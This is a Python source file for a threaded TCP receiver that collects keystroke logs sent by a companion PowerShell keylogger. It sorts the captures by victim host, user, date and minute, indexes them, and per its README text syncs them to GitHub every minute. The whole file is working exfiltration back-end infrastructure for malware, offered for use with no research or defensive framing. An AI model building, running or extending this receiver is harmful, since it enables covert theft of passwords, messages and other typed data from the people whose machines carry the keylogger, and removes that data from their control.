#!/usr/bin/env python3
"""TCP keylog receiver — structured captures for GitHub sync.

Layout (under CAPTURE_ROOT, default /opt/kl-recv/captures):
  captures/{host}/{user}/{YYYY-MM-DD}/{HH-MM}.txt

Also appends logs/live.log for debugging.

Packet format from keylogger.ps1:
  #KL|v=2|host=NAME|user=NAME|lang=0419|tag=ru-RU\\n
  <utf-8 body>

Legacy plain chunks go to captures/_unknown/_unknown/...
"""
from __future__ import annotations

import os
import re
import socket
import socketserver
import threading
from datetime import datetime, timezone
from pathlib import Path

HOST = os.environ.get("KL_HOST", "0.0.0.0")
PORT = int(os.environ.get("KL_PORT", "4444"))
OUT = Path(os.environ.get("KL_OUT", "logs"))
CAPTURE_ROOT = Path(os.environ.get("KL_CAPTURES", str(Path(__file__).resolve().parent / "captures")))
MAX_CHUNK = 1_000_000
READ_TIMEOUT = 30.0

_SAFE = re.compile(r"[^A-Za-z0-9._\-@]+")
_META = re.compile(
    r"^#KL\|v=(?P<v>\d+)\|host=(?P<host>[^|]+)\|user=(?P<user>[^|]+)"
    r"(?:\|lang=(?P<lang>[^|]+))?(?:\|tag=(?P<tag>[^|\r\n]+))?\r?\n",
    re.ASCII,
)

_write_lock = threading.Lock()


def safe_part(s: str, fallback: str = "_unknown") -> str:
    s = (s or "").strip()
    if not s:
        return fallback
    s = _SAFE.sub("_", s)
    s = s.strip("._") or fallback
    return s[:120]


def parse_packet(raw: bytes) -> tuple[str, str, str, str, bytes]:
    """Return host, user, lang, tag, body_bytes."""
    try:
        text = raw.decode("utf-8")
    except UnicodeDecodeError:
        text = raw.decode("utf-8", errors="replace")

    m = _META.match(text)
    if not m:
        # legacy banner: --- host=X user=Y
        host, user = "_unknown", "_unknown"
        bm = re.search(r"host=([^\s]+)\s+user=([^\s]+)", text)
        if bm:
            host, user = bm.group(1), bm.group(2)
        return host, user, "0000", "unk", raw

    body = text[m.end() :].encode("utf-8")
    return (
        m.group("host"),
        m.group("user"),
        m.group("lang") or "0000",
        m.group("tag") or "unk",
        body,
    )


def minute_paths(host: str, user: str, now: datetime) -> Path:
    day = now.strftime("%Y-%m-%d")
    minute = now.strftime("%H-%M")
    return (
        CAPTURE_ROOT
        / safe_part(host)
        / safe_part(user)
        / day
        / f"{minute}.txt"
    )


def append_capture(
    host: str,
    user: str,
    lang: str,
    tag: str,
    body: bytes,
    peer: str,
    now: datetime,
) -> Path:
    path = minute_paths(host, user, now)
    path.parent.mkdir(parents=True, exist_ok=True)
    stamp = now.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    header = (
        f"\n--- {stamp} peer={peer} lang={lang} tag={tag} bytes={len(body)} ---\n"
    ).encode("utf-8")
    with _write_lock:
        with path.open("ab") as f:
            f.write(header)
            f.write(body)
            if body and not body.endswith(b"\n"):
                f.write(b"\n")
            f.flush()
        # index line for quick listing
        index = CAPTURE_ROOT / "index.log"
        with index.open("a", encoding="utf-8") as ix:
            ix.write(
                f"{stamp}\t{safe_part(host)}\t{safe_part(user)}\t"
                f"{lang}\t{tag}\t{len(body)}\t{path.relative_to(CAPTURE_ROOT)}\n"
            )
    return path


class Handler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        peer = self.client_address[0]
        self.request.settimeout(READ_TIMEOUT)
        buf = bytearray()
        try:
            while True:
                try:
                    block = self.request.recv(8192)
                except socket.timeout:
                    break
                if not block:
                    break
                buf.extend(block)
                if len(buf) > MAX_CHUNK:
                    buf = buf[:MAX_CHUNK]
                    break
        except OSError:
            pass

        if not buf:
            return

        now = datetime.now(timezone.utc)
        host, user, lang, tag, body = parse_packet(bytes(buf))
        ts = now.strftime("%Y%m%d_%H%M%S")
        safe_ip = peer.replace(":", "_")

        OUT.mkdir(parents=True, exist_ok=True)
        CAPTURE_ROOT.mkdir(parents=True, exist_ok=True)

        chunk_path = OUT / f"{ts}_{safe_ip}.txt"
        live_path = OUT / "live.log"
        live_hdr = (
            f"\n--- {ts} utc from {peer} host={host} user={user} "
            f"lang={lang} tag={tag} ({len(buf)} bytes) ---\n"
        ).encode("utf-8")

        try:
            chunk_path.write_bytes(bytes(buf))
            with live_path.open("ab") as f:
                f.write(live_hdr)
                f.write(bytes(buf))
                f.flush()
            cap = append_capture(host, user, lang, tag, body, peer, now)
            print(
                f"ok {peer} {len(buf)}B host={host} user={user} "
                f"lang={lang}/{tag} -> {cap}",
                flush=True,
            )
        except OSError as e:
            try:
                print(f"write fail {peer}: {e}", flush=True)
            except Exception:
                pass


class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    CAPTURE_ROOT.mkdir(parents=True, exist_ok=True)
    readme = CAPTURE_ROOT / "README.md"
    if not readme.exists():
        readme.write_text(
            "# Keylog captures\n\n"
            "Tree: `{host}/{user}/{YYYY-MM-DD}/{HH-MM}.txt` (UTC).\n"
            "Synced to GitHub every minute by `github_sync.sh`.\n",
            encoding="utf-8",
        )
    srv = ThreadedServer((HOST, PORT), Handler)
    print(
        f"listening {HOST}:{PORT} logs={OUT.resolve()} captures={CAPTURE_ROOT.resolve()}",
        flush=True,
    )
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("stop", flush=True)
    finally:
        srv.server_close()


if __name__ == "__main__":
    main()
